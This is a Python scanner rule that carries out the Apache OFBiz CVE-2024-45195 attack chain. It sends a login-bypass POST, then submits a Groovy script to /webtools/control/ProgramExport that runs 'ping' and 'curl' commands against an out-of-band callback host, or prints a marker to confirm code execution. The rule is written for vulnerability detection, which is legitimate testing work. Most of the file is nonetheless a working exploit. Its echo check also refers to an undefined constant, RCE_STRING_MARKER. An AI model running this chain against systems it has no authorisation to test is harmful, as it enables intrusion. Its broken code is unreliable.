# Filename: VulnerabilityChecks/ApacheOFBizAuthBypassRCECVE202445195ScanRule.py

import asyncio
import logging
import random
import string
import uuid
import urllib.parse
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple, TYPE_CHECKING, Set

import aiohttp

if TYPE_CHECKING:
    from asyncio import Queue # For type hinting

@dataclass
class OFBizCVE202445195Alert:
    cwe_id: int = 288
    wasc_id: int = 1
    name: str = "Apache OFBiz Authentication Bypass and RCE (CVE-2024-45195)"
    description: str = ""
    uri: str = ""
    attack_sequence: List[Dict[str, Any]] = field(default_factory=list)
    evidence: str = ""
    other_info: str = ""
    solution: str = (
        "Upgrade Apache OFBiz to version 18.12.14 or later. "
        "Review and apply security configurations as recommended by the Apache OFBiz project. "
        "Restrict access to administrative interfaces like /webtools/ if not needed externally."
    )
    reference: str = (
        "CVE-2024-45195\n"
        "https://www.rapid7.com/blog/post/2024/07/22/cve-2024-45195-apache-ofbiz-authentication-bypass-remote-code-execution-fixed/\n"
        "https://ofbiz.apache.org/security.html"
    )
    risk: int = 4
    confidence: int = 2
    # Class level constants for confidence
    CONFIDENCE_HIGH: int = 3
    CONFIDENCE_MEDIUM: int = 2
    CONFIDENCE_LOW: int = 1

    oast_interaction_id: Optional[str] = None
    alert_tags: Dict[str, str] = field(default_factory=lambda: {
        "CVE": "CVE-2024-45195",
        "OWASP_2021_A07": "Identification and Authentication Failures",
        "OWASP_2021_A03": "Injection",
        "WSTG_V42_ATHN_04": "Testing_for_Bypassing_Authentication_Schema",
        "WSTG_V42_INPV_12": "Testing_for_Command_Injection",
    })

    def as_dict(self) -> Dict[str, Any]:
        tags = self.alert_tags.copy()
        if self.oast_interaction_id:
            tags["OAST_Interaction"] = "Detected"
        
        return {
            "vulnerability_type": "AuthBypass_RCE",
            "type": self.name,
            "detail": self.description,
            "payload_used": f"Attack Sequence: {len(self.attack_sequence)} steps. RCE Payload: (see other_info or OAST ID)",
            "injection_point_info": "Multi-stage: Auth bypass at /login, RCE at /webtools/control/ProgramExport",
            "url_tested": self.uri,
            "severity": {1: "Info", 2: "Low", 3: "Medium", 4: "High"}.get(self.risk, "Unknown"),
            "confidence": {1: "Low", 2: "Medium", 3: "High"}.get(self.confidence, "Unknown"),
            "evidence": self.evidence,
            "solution": self.solution,
            "reference": self.reference,
            "cwe_id": self.cwe_id,
            "wasc_id": self.wasc_id,
            "alert_tags": tags,
            "other_info": self.other_info,
            "attack_sequence_details": self.attack_sequence
        }

DEFAULT_OFBIZ_USERNAME = "admin"
LOGIN_PATH = "/login/control/login"
LOGIN_PATH_ALT = "/login" # If OFBiz is deployed not at root, /login might be the direct path
RCE_PATH = "/webtools/control/ProgramExport"
ECHO_STRING_MARKER = "OFBIZRCETEST"
RCE_PAYLOAD_ECHO = f"println('{ECHO_STRING_MARKER}');"

class ApacheOFBizAuthBypassRCECVE202445195ScanRule:
    tech_required: Set[str] = {"Apache OFBiz"} # Specific to OFBiz
    def __init__(self,
                 parent_logger: Optional[logging.Logger] = None,
                 oast_base_url: Optional[str] = None,
                 http_timeout: float = 20.0,
                 usernames_to_try: Optional[List[str]] = None,
                 active_scan_async_q: Optional['Queue'] = None # Added parameter
                 ):
        self.logger = parent_logger or logging.getLogger(__name__)
        self.oast_base_url = self._normalize_oast_url(oast_base_url) if oast_base_url else None
        self.http_timeout = http_timeout
        self.usernames = usernames_to_try or [DEFAULT_OFBIZ_USERNAME]
        self.active_scan_async_q = active_scan_async_q # Store the queue
        
        if not self.oast_base_url:
            self.logger.info("OFBiz CVE-2024-45195: OAST base URL not configured. RCE confirmation will rely on echo.")

    def _normalize_oast_url(self, url: str) -> str:
        parsed = urllib.parse.urlparse(url)
        return parsed.netloc if parsed.netloc else parsed.path.split('/')[0]

    def _get_rce_payload_oast(self, unique_id: str) -> str:
        if not self.oast_base_url:
            return RCE_PAYLOAD_ECHO
        
        oast_target = f"{unique_id}.{self.oast_base_url}"
        return f"try {{ 'ping -c 1 {oast_target}'.execute().waitForOrKill(5000); }} catch (Exception e) {{ try {{ 'curl -m 5 http://{oast_target}'.execute().waitForOrKill(5000); }} catch (Exception e2) {{ println('OAST_CMD_FAIL'); }} }} println('OAST_ATTEMPTED_{unique_id}');"

    async def _send_request_manage_session(
        self,
        session: aiohttp.ClientSession,
        method: str, url: str,
        headers: Optional[Dict[str, str]] = None,
        data: Optional[Dict[str, str]] = None,
        allow_redirects: bool = False
    ) -> Tuple[Optional[Any], str, Dict[str,str]]: # Changed return type for resp_attrs
        
        current_headers = (headers or {}).copy()
        if "User-Agent" not in current_headers:
             current_headers["User-Agent"] = random.choice([
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
            ])
        if data and method.upper() == "POST" and "Content-Type" not in current_headers:
            current_headers["Content-Type"] = "application/x-www-form-urlencoded"

        self.logger.debug(f"OFBiz Scan: Sending {method} to {url}. Data: {str(data)[:200] if data else 'None'}")
        
        text_content = ""
        response_cookies = {}
        resp_status = None
        resp_headers_dict = {}

        try:
            timeout = aiohttp.ClientTimeout(total=self.http_timeout)
            async with session.request(
                method.upper(), url, headers=current_headers, data=data, 
                timeout=timeout, allow_redirects=allow_redirects
            ) as resp:
                resp_status = resp.status
                resp_headers_dict = dict(resp.headers)
                text_content = await resp.text(errors='replace')
                for cookie in session.cookie_jar:
                    # Ensure domain matching logic is robust
                    cookie_domain = cookie['domain']
                    target_netloc = urllib.parse.urlparse(url).netloc
                    if cookie_domain == target_netloc or target_netloc.endswith(f".{cookie_domain}") or cookie_domain.startswith('.'):
                        response_cookies[cookie.key] = cookie.value
                self.logger.debug(f"OFBiz Scan: Response from {url}: Status {resp_status}. Cookies captured: {len(response_cookies)}")
        except Exception as e:
            self.logger.warning(f"OFBiz Scan: Request to {url} failed: {type(e).__name__} - {e}")
        
        @dataclass
        class DetachedRespAttrs: status: Optional[int]; headers: Dict; text: str
        
        return DetachedRespAttrs(status=resp_status, headers=resp_headers_dict, text=text_content), text_content, response_cookies

    async def _queue_alert(self, alert_instance: OFBizCVE202445195Alert):
        if self.active_scan_async_q:
            try:
                await self.active_scan_async_q.put({"type": "active_scan_alert", "alert": alert_instance.as_dict()})
            except Exception as e_queue:
                self.logger.error(f"Failed to put OFBiz CVE-2024-45195 alert onto async queue: {e_queue}")
        else:
            self.logger.warning("active_scan_async_q not available in OFBiz rule, cannot queue alert.")

    async def scan(
        self,
        base_app_url: str,
        aiohttp_session: aiohttp.ClientSession,
        # The following are part of a more generic signature but less used by this specific rule
        original_headers: Optional[Dict[str, str]] = None, 
        original_cookies: Optional[Dict[str, str]] = None,
        page_specific_technologies: Optional[List[str]] = None,
        injection_details: Optional[Dict[str, Any]] = None,
        original_page_content_for_baseline_errors: Optional[str] = None
    ) -> None: # Changed return type to None
        
        if not self.active_scan_async_q:
            self.logger.warning("OFBiz CVE-2024-45195 scan skipped: active_scan_async_q not configured.")
            return

        attack_sequence_log: List[Dict[str, Any]] = []
        alerts_generated_count = 0

        if not base_app_url.endswith('/'):
            base_app_url += '/'

        login_paths_to_try = [LOGIN_PATH, LOGIN_PATH_ALT]
        actual_login_path = None

        for username_to_test in self.usernames:
            self.logger.info(f"OFBiz CVE-2024-45195: Attempting auth bypass for user '{username_to_test}' at {base_app_url}")
            
            auth_bypass_success = False
            
            # Clear previous cookies from this session for this specific rule's attempt
            # This is important if the session is reused.
            current_cookies_before_bypass = {c.key: c.value for c in aiohttp_session.cookie_jar}
            aiohttp_session.cookie_jar.clear() # Start fresh for this username attempt

            for login_path_suffix in login_paths_to_try:
                login_url = urllib.parse.urljoin(base_app_url, login_path_suffix.lstrip('/'))
                auth_bypass_payload = {
                    "USERNAME": username_to_test,
                    "PASSWORD": "password",
                    "requirePasswordChange": "Y"
                }
                current_step_log = {"step": "Auth Bypass Attempt", "url": login_url, "method": "POST", "payload": auth_bypass_payload}
                
                resp_attrs, _, current_session_cookies = await self._send_request_manage_session(
                    aiohttp_session, "POST", login_url, data=auth_bypass_payload, allow_redirects=True
                )
                
                current_step_log["response_status"] = resp_attrs.status if resp_attrs else "Request Failed"
                attack_sequence_log.append(current_step_log)
                
                if resp_attrs and resp_attrs.status is not None:
                    # Check for successful login indicators (e.g., specific cookies, or redirection to a dashboard)
                    # OFBiz often uses JSESSIONID. OFBiz.Visitor is also common.
                    # A 302 redirect to a dashboard after login is also a good sign.
                    # The Rapid7 article mentions a 302 to /webtools/control/main
                    is_likely_success = False
                    if "JSESSIONID" in current_session_cookies: # Check cookies from the session jar
                        is_likely_success = True
                        if resp_attrs.status == 302 and resp_attrs.headers:
                            location_header = resp_attrs.headers.get('Location', '').lower()
                            if '/webtools/control/main' in location_header or '/control/main' in location_header: # Common dashboard paths
                                self.logger.info(f"OFBiz CVE-2024-45195: Redirected to dashboard-like URL: {location_header}")
                            else: # If redirect to login page, it's a failure
                                if '/login' in location_header or login_url in location_header:
                                    is_likely_success = False


                    if is_likely_success:
                        self.logger.info(f"OFBiz CVE-2024-45195: Potential auth bypass successful for user '{username_to_test}' via {login_url}. Status: {resp_attrs.status}. Cookies: {list(current_session_cookies.keys())}")
                        auth_bypass_success = True
                        actual_login_path = login_path_suffix
                        break 
                else:
                    self.logger.warning(f"OFBiz CVE-2024-45195: Auth bypass request to {login_url} failed (no response attributes).")


            if not auth_bypass_success:
                self.logger.info(f"OFBiz CVE-2024-45195: Auth bypass failed for user '{username_to_test}'.")
                # Restore cookies if they were cleared, before trying next username or exiting
                for k,v in current_cookies_before_bypass.items(): aiohttp_session.cookie_jar.update_cookies({k:v})
                continue

            self.logger.info(f"OFBiz CVE-2024-45195: Attempting RCE after potential auth bypass for '{username_to_test}'.")
            rce_url = urllib.parse.urljoin(base_app_url, RCE_PATH.lstrip('/'))
            
            unique_oast_id = str(uuid.uuid4())
            rce_groovy_payload = self._get_rce_payload_oast(unique_oast_id) if self.oast_base_url else RCE_PAYLOAD_ECHO
            
            rce_form_data = {"groovyProgram": rce_groovy_payload}
            current_step_log_rce = {"step": "RCE Attempt", "url": rce_url, "method": "POST", "payload": rce_form_data, "groovy_script": rce_groovy_payload}
            
            resp_attrs_rce, rce_response_text, _ = await self._send_request_manage_session(
                aiohttp_session, "POST", rce_url, data=rce_form_data
            )
            current_step_log_rce["response_status"] = resp_attrs_rce.status if resp_attrs_rce else "Request Failed"
            attack_sequence_log.append(current_step_log_rce)

            rce_confirmed_evidence = None
            alert_confidence = OFBizCVE202445195Alert.CONFIDENCE_LOW # Default to low if only auth bypass seems to work

            if resp_attrs_rce and resp_attrs_rce.status is not None:
                if self.oast_base_url:
                    rce_confirmed_evidence = f"OAST interaction attempt made. Check OAST server for ID: {unique_oast_id}. Groovy payload: {rce_groovy_payload}"
                    alert_confidence = OFBizCVE202445195Alert.CONFIDENCE_MEDIUM
                    self.logger.info(f"OFBiz CVE-2024-45195: RCE OAST payload sent. ID: {unique_oast_id}")
                
                if RCE_PAYLOAD_ECHO in rce_groovy_payload and RCE_STRING_MARKER in rce_response_text:
                    rce_confirmed_evidence = f"Echo marker '{RCE_STRING_MARKER}' found in response after RCE attempt."
                    alert_confidence = OFBizCVE202445195Alert.CONFIDENCE_HIGH
                    self.logger.info(f"OFBiz CVE-2024-45195: RCE confirmed via echo marker.")
                
                elif not rce_confirmed_evidence and resp_attrs_rce.status == 200:
                     rce_confirmed_evidence = f"RCE attempt returned HTTP 200, but no direct confirmation via OAST/echo. Manual verification advised. Response snippet: {rce_response_text[:200]}"
                     # Confidence remains low if only auth bypass + 200 on RCE path
                     alert_confidence = OFBizCVE202445195Alert.CONFIDENCE_LOW if not self.oast_base_url else OFBizCVE202445195Alert.CONFIDENCE_MEDIUM
            else:
                rce_confirmed_evidence = "RCE attempt request failed or returned no attributes."
                alert_confidence = OFBizCVE202445195Alert.CONFIDENCE_LOW

            # Only raise alert if auth bypass was successful AND there's some evidence for RCE (even if just an attempt)
            if auth_bypass_success and rce_confirmed_evidence:
                alert = OFBizCVE202445195Alert(
                    description=(
                        f"The application appears to be vulnerable to Apache OFBiz CVE-2024-45195. "
                        f"An authentication bypass was attempted for username '{username_to_test}' via '{actual_login_path}', "
                        f"followed by a Remote Code Execution attempt via '{RCE_PATH}'. "
                        f"Confirmation: {rce_confirmed_evidence}"
                    ),
                    uri=base_app_url,
                    attack_sequence=list(attack_sequence_log),
                    evidence=rce_confirmed_evidence,
                    other_info=f"Attempted Username: {username_to_test}. RCE Payload (Groovy): {rce_groovy_payload}. OAST ID (if used): {unique_oast_id if self.oast_base_url else 'N/A'}",
                    confidence=alert_confidence,
                    oast_interaction_id=unique_oast_id if self.oast_base_url and "OAST interaction attempt" in rce_confirmed_evidence else None
                )
                await self._queue_alert(alert)
                alerts_generated_count += 1
                if alert_confidence == OFBizCVE202445195Alert.CONFIDENCE_HIGH:
                    break 
            
            # Restore cookies if they were cleared, before trying next username or exiting
            # This ensures the main session isn't polluted if this rule is one of many.
            aiohttp_session.cookie_jar.clear() 
            for k,v in current_cookies_before_bypass.items(): aiohttp_session.cookie_jar.update_cookies({k:v})


        if alerts_generated_count > 0:
            self.logger.info(f"OFBiz CVE-2024-45195 scan for {base_app_url} completed. Found {alerts_generated_count} potential alerts.")
        else:
            self.logger.info(f"OFBiz CVE-2024-45195 scan for {base_app_url} completed. No alerts generated.")
        return